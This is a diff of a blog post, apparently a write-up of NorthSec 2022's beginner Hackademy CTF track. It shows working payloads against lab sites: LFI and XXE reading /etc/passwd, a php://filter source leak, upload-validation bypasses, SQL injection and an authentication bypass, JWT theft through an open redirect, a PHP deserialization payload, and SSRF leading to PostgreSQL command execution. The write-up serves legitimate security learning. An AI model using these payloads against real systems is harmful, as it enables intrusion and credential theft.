@@ -3,9 +3,9 @@ title: "Northsec Hackademy"
 date: 2022-05-28
 ---
 
-This year I participated again in NorthSec CTF. The events leading to this CTF are fun, some warmup challenges annouced in the Discord. There was signal analysis, git secret recovery, code audit, fuzzing, some NFT Shenanigan and more. Some were pretty rough but there was plenty hints that were added to allows people to catch up. 
+This year I participated again in NorthSec CTF. The events leading to this CTF are fun, some warmup challenges announced in the Discord. There was signal analysis, git secret recovery, code audit, fuzzing, some NFT Shenanigan and more. Some were pretty rough but there was plenty hints that were added to allow people to catch up. 
 
-As for the CTF itself, it was pretty insanely hard except for the beginner track: Hackademy. It was the same as last year with some minor changes and I took the time to complete every challenge, asking for help to solve some of them. Here is the writeup for the Hackademy track.
+As for the CTF itself, it was insanely hard except for the beginner track: Hackademy. It was the same as last year with some minor changes and I took the time to complete every challenge, asking for help to solve some of them. Here is the writeup for the Hackademy track.
 
 ![Hackademy website](/will-hack-for-coffee/assets/images/nsec2022/hackademy.png)
 
@@ -36,17 +36,21 @@ FLAG-3564934ce48dd205525279f69be8a810 (2/2)
 
 ## Inclusion 101, 102, 103
 
-A classic local file inclusion exist on this site. The url is:
+A classic local file inclusion exist on this site. The URL is:
+
 http://chal2.hackademy.ctf/?page=welcome.php
+
 What if I specified /etc/passwd instead of welcome.php? Well here is our trainer:
 ````
 ...
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 trainer:x:1001:1001:Trainer:FLAG-446fd3bcb4a9c08cd5cb25e113aaa1e5,,,,:/bin/false:/sbin/nologin
 ````
-For the next one, you need to look at the source code. I tried this URL:
+For the next one, you need to look at the source code. PHP has a nice feature that allows you to convert a file to base64. In our case it will prevent index.php from being interpreted. So I tried this URL:
+
 http://chal2.hackademy.ctf/?page=php://filter/convert.base64-encode/resource=index.php
-and it outputted a long base64 string. PHP has a nice feature thats allows you to convert a file to base64. In our case it will prevent index.php from being interpreted. Decoding the resulting string you got the source code which included the flag:
+
+It outputted a long base64 string. Decoding the resulting string I got the source code which included the flag:
 ````
 <?php
     #FLAG-8f54c17252eb57ff6cf91f97828f3f54 (2/2)
@@ -66,11 +70,11 @@ and it outputted a long base64 string. PHP has a nice feature thats allows you t
     <head>
     ...
 ````
-Last of these challenge is a nice XML external entity injection (XXE). Looking at the source code:
+Last of these challenge use XML external entity injection (XXE). Hopefully I had an [enraged hacker (who is also an SQL genius)](https://gitlab.com/sebast331-ctf) who reminded me of the technique. Looking at the source code:
 
 ![Inclusion 3 source code](/will-hack-for-coffee/assets/images/nsec2022/inclusion3-source.png)
 
-I sent the POST from the underlying Javascript to my Burp Repeater tab and edited the body likeso:
+I sent the POST from the underlying Javascript to my Burp Repeater tab and edited the body like so:
 ````
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file://etc/passwd" > ]>
 <function>
@@ -84,11 +88,13 @@ So the content of the passwd file is shown in the ext variable on the website.
 
 ## Upload 101, 102, 103 and 104
 
-So here the callenges are to evade validation and upload a php file with remote code execution. 
-![File upload website](/will-hack-for-coffee/assets/images/nsec2022/file-upload.png)
-So for the first challenge I renamed my file to reverse.jpg.php. The file will be interpreted has PHP and my code will be executed. The validation probably only check if the alllowed extension where in the filename.
+So here the challenges are to evade validation and upload a php file with remote code execution.
 
-For the second challenge I needed to modify the Content-Type header for image/jpeg:
+![File upload website](/will-hack-for-coffee/assets/images/nsec2022/file-upload.png)
+
+So for the first challenge I renamed my file to reverse.jpg.php. The file will be interpreted as PHP and my code could be executed. The validation probably only check if the allowed extension was in the filename.
+
+For the second challenge I needed to modify the Content-Type header for image/jpeg with the [following value](https://en.wikipedia.org/wiki/List_of_file_signatures):
 
 ![Content-Type header](/will-hack-for-coffee/assets/images/nsec2022/content-type.png)
 
@@ -96,9 +102,9 @@ For the third challenge I submitted the same file and it warn me that the signat
 
 ![Hexed.it](/will-hack-for-coffee/assets/images/nsec2022/hexed.png)
 
-The resulting file was uploaded the forged file (again modifying the Content-Type header).
+The resulting forged file was uploaded (again modifying the Content-Type header).
 
-For the last upload challenge I renamed the file to rev.png.php3 a less used but valid PHP extension. The validation must have been a blacklist on .php extension.
+For the fourth upload challenge I renamed the file to rev.png.php3 a less used but valid PHP extension. The validation must have been a blacklist on .php extension.
 
 ## SQL 101 and 102
 
@@ -172,25 +178,25 @@ Table: fl4G_1s_H3re
 +-----------------------------------------------------------------------------------------------------------------------------+
 ...
 ````
-The next challenge was an authentication bypass (well I already had the password of user admin but yeah). Here is the payload I used:
+Revealing the flag in the table fl4G_1s_H3re. The next challenge was an authentication bypass (well I already had the password of user admin but yeah). Here is the payload I used:
 ````
 ' UNION SELECT '', '', '' --
 ````
-It works because the query return one (empty) row.
+It works because the query returns one (empty) row.
 
 ## Open redirect 101
 
-Open redirect is that even a vulnerability? I browse the site and there was two links:
+Open redirect is that even a vulnerability? I browsed the site and there was two links:
 
 ![Open redirect 101](/will-hack-for-coffee/assets/images/nsec2022/open-redirect101.png)
 
-Navigating the first link and looking at Burp I saw that there was a redirect containing a jwt token:
+Navigating the first link and looking at Burp I saw that there was a redirect containing a Jason Web Token token:
 
 ![JWT redirect](/will-hack-for-coffee/assets/images/nsec2022/jwt-redirect.png)
 
-You can use [jwt.io](jwt.io) to checkout what's inside the token and confirm it's a jwt but everytime I see the string "eyJ" I suspect a JWT.
+You can use [jwt.io](jwt.io) to checkout what's inside the token and confirm it's a JWT but everytime I see the string "eyJ" I suspect a JWT.
 
-I found this challenge interesting, it was the first time I saw a redirection used to steal credentials. Next link you can provide an URL and your "Grand master pentester" will visit it. Our team own a small server on the nsec network so I redirected him there:
+I found this challenge interesting, it was the first time I saw simple redirection used to steal credentials. Next link allows you to provide an URL and the "Grand master pentester" will visit it. Our team own a small server on the nsec network so I redirected him there:
 http://chal5.hackademy.ctf/?sub_url=http://shell.ctf
 Looking at our server log:
 ````
@@ -199,14 +205,13 @@ root@ctn-shell:/var/log/apache2#cat access.log
 ...
 9000:91a:201:cdba:216:3eff:fe01:b3fd - - [21/May/2022:05:56:49 +0000] "GET /?identity=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9zdWIuY2hhbDUuaGFja2FkZW15LmN0ZlwvIiwiaWF0IjoxNjUzMTEyNjA5LCJuYmYiOjE2NTMxMTI2MDksImV4cCI6MTY1MzExMjkwOSwidXNlciI6IlVuZm9ydHVuYXRlIFBlbnRlc3RlciIsInJvbGUiOiJHcmFuZCBNYXN0ZXIgUGVudGVzdGVyIn0.Cv8ROC8pX7HMXwSnjgtYvQbqFVEc2xOqEz9dLiDnt0s HTTP/1.1" 200 11173 "-" "-"
 ````
-We can see his credentials and use it to log as our "master".
+I can see his credentials and I used it to log as my "master".
 
-(insert grand-master-credentials)
 ![Grand master credentials](/will-hack-for-coffee/assets/images/nsec2022/grand-master-credentials.png)
 
 ### Serialize 101
 
-A simple Hello word! page with the source available. There a weird s parameter that I will tamper with later.
+A simple Hello word! page with the source available. There is also weird s parameter that I will tamper with later.
 
 ````
 <?php
@@ -251,7 +256,7 @@ A simple Hello word! page with the source available. There a weird s parameter t
 </html>
 ````
 
-It took me some time to understand this challenge even if I [ripped](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/) it from a friend. The flag is in the source code but it's replaced by x if it's viewed from the link. It seems there is a function in PHP you can use to [serialize](https://www.php.net/manual/en/function.serialize.php) values. The s parameter contain a class that is to be de-serialized. It will then automatically launch the __wakeup function which launch the WelcomeMessage function. What I will do is create a new class that will call the GiveMeFlagPrettyPlease function instead. A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so I created this little script: 
+It took me some time to understand this challenge even if I [ripped](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/) it from a friend. The flag is in the source code but it's replaced by x if it's viewed from the link. It seems there is a function in PHP you can use to [serialize](https://www.php.net/manual/en/function.serialize.php) values. The s parameter contains a class that is to be de-serialized. It will then automatically launch the __wakeup function which launch the WelcomeMessage function. What I will do is create a new class that will call the GiveMeFlagPrettyPlease function instead. A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so I created this little script: 
 ````
 <?php
     class Hackademy{
@@ -265,37 +270,37 @@ Ran it:
 └─$ php serialize.php  
 Tzo5OiJIYWNrYWRlbXkiOjE6e3M6MTU6IgBIYWNrYWRlbXkAY2FsbCI7czoyMjoiR2l2ZU1lRmxhZ1ByZXR0eVBsZWFzZSI7fQ== 
 ````
-I then used that base64 string in the s parameter and got the flag!
+I then used that base64 string in the s parameter and got the flag.
 
 ## (Server Side Request) Forgery 101, 102 and 103
 
-This website allow you to send some commands like ping and such. But you can also use a less well known protocole called file and obtain file located on the server and it will not be interpretated. I'm not familiar with PHP file structure but apparently it's a well known file:
+This website allows you to send some commands like ping and such. But you can also use a less well-known protocol called file and obtain file located on the server and it will not be interpretated. I'm not familiar with PHP file structure but apparently, it's a well known file:
 
 ![Server Side Request Forgery 101](/will-hack-for-coffee/assets/images/nsec2022/ssrf101.png)
 
-So here is the first flag with some database credentials. The localhost is on the server side (it's not the same as our localhost). Here is another important file used by apache server:
+So here is the first flag with some bonus database credentials. Here is another important file used by the Apache server:
 
 ````
 file:///etc/apache2/sites-enabled/000-default.conf
 
 <VirtualHost *:80>
-	ServerName localhost
-	DocumentRoot /var/www/html/api
+    ServerName localhost
+    DocumentRoot /var/www/html/api
 </VirtualHost>
 
 <VirtualHost *:8080>
-	ServerName localhost
-	DocumentRoot /var/www/html/database
+    ServerName localhost
+    DocumentRoot /var/www/html/database
 
-	<Directory /var/www/html/database>
-		Order deny,allow
-		Deny from all
-		Allow from ::1
-		Allow from localhost
-	</Directory>
+    <Directory /var/www/html/database>
+        Order deny,allow
+        Deny from all
+        Allow from ::1
+        Allow from localhost
+    </Directory>
 </VirtualHost>
 ````
-So that's where the database is but it can only be accessed from the server as local. I was a bit confused for that part but an [enraged hacker (but SQL genius)](https://gitlab.com/sebast331-ctf) gently nudged in the right direction. Let's take a look at the source code:
+So that's where the database is but it can only be accessed locally from the server. I was a bit confused for that part but an enraged hacker gently nudged in the right direction. Let's take a look at the source code:
 ````
 <?php 
     if(isset($_POST['user'], $_POST['password'])) {
@@ -329,16 +334,17 @@ So that's where the database is but it can only be accessed from the server as l
         die();
     }
 ````
-Let's query the table of that database (we can guess it's a postgresql database) using built-in database table:
+Let's query the table of that database (we can guess it's a PostgreSQL database from the user) using a built-in database table:
 
 ![Server Side Request Forgery 102](/will-hack-for-coffee/assets/images/nsec2022/ssrf102.png)
 
-Then I used that parameters to get the flag:
+Then I used that parameter to get the flag:
 ````
 user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_25bb3839f80731bb
 ````
 
-The last flag was simply /flag.txt last year so I lucked out getting it. This year it was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (make sure to diable this on your production server!):
-(insert postgresql-rce)
+The last flag was simply /flag.txt last year so I lucked out getting it. This year it was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (make sure to disable this on your production server!):
+
 ![Postgresql remote command execution](/will-hack-for-coffee/assets/images/nsec2022/postgresql-rce.png)
-But instead of logging in the database you use the query to create the table, copy your command and execute them. Looking at the root folder you will see a file indicated as file that you can read to obtain the flag. Congratulation and enjoy your newly acquired Hackademy Certified Ethical Hacker!
+
+But instead of logging in the database you use the query to create the table, copy your command and execute them. Looking at the root folder I listed the flag and read it. Congratulation and enjoy your newly acquired Hackademy Certified Ethical Hacker!
